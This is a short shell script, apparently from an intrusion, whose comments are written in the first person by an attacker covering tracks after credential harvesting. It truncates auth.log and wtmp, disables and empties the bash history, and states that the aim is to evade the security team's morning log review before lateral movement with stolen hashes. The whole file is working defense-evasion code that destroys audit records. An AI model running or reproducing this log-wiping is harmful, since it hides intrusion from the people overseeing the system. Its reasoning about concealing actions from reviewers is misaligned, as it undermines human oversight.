#!/bin/sh
# Defense evasion. The credential-harvesting step earlier left entries in auth.log and the
# bash history; I need to clear those because the SOC reviews auth logs each morning.
# I will truncate rather than delete, since a missing file is more suspicious than an
# empty one, and I will do the history file last so this cleanup itself is not recorded.
: > /var/log/auth.log
: > /var/log/wtmp
# Now removing my own entries from the shell history; after this I move to the lateral
# movement phase using the hashes I staged at /dev/shm/.h
unset HISTFILE
: > ~/.bash_history
